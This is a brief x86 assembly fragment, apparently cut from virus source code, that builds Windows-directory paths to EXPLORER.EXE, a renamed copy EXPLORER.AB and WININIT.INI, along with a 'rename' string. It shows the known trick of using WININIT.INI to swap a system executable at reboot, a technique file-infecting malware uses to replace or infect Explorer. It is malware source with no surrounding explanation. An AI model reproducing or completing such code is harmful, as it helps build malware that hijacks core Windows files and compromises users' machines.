
                        lea     edi, file_src
                        call    __windir
                        x_stosd \EXPLORER.EXE~

                        lea     edi, file_dst
                        call    __windir
                        x_stosd \EXPLORER.AB~

                        lea     edi, file_wii
                        call    __windir
                        x_stosd \WININIT.INI~

                        lea     edi, renamestr
                        x_stosd rename~
